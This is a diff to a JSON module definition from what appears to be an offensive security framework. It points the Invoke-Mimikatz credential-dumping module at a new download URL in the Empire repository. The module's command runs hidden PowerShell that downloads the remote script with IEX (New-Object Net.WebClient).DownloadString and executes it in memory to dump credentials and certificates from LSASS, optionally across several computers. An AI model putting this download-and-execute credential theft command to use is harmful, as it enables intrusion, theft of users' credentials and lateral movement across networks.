@@ -9,8 +9,8 @@
     "arch": "x64",
     "lang": "PowerShell",
     "privilege": true,
-    "notes": "This is part of the PowerSploit project https://github.com/PowerShellMafia/PowerSploit",
-    "remote": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1",
+    "notes": "Invoke-Mimikatz.ps1 is currently part of the Empire project https://github.com/BC-SECURITY/Empire and was originally part of the PowerSploit project https://github.com/PowerShellMafia/PowerSploit",
+    "remote": "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1",
     "local": ["data", "src", "PowerSploit", "Exfiltration", "Invoke-Mimikatz.ps1"],
     "options": [
       {"name": "DumpCreds", "value": "true", "required": false, "flag": "-DumpCreds", "description":"[Switch]Use mimikatz to dump credentials out of LSASS."},
@@ -18,12 +18,12 @@
       {"name": "Command", "value": null, "required": false, "flag": "-Command", "description":"Supply mimikatz a custom command line. This works exactly the same as running the mimikatz executable like this: mimikatz \"privilege::debug exit\" as an example."},
       {"name": "ComputerName", "value": null, "required": false, "flag": "-ComputerName", "description":"Optional, an array of computernames to run the script on."}
     ],
-    "description": "This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as dump credentials without ever writing the mimikatz binary to disk. The script has a ComputerName parameter which allows it to be executed against multiple computers. This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.",
+    "description": "This script leverages Mimikatz 2.2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as dump credentials without ever writing the mimikatz binary to disk. The script has a ComputerName parameter which allows it to be executed against multiple computers. This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.",
     "commands": [
       "powershell.exe",
       "-nop",
       "-w 0",
-      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');",
+      "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');",
       "Invoke-Mimikatz",
       "{{DumpCreds.Flag}}",
       "{{DumpCerts.Flag}}",
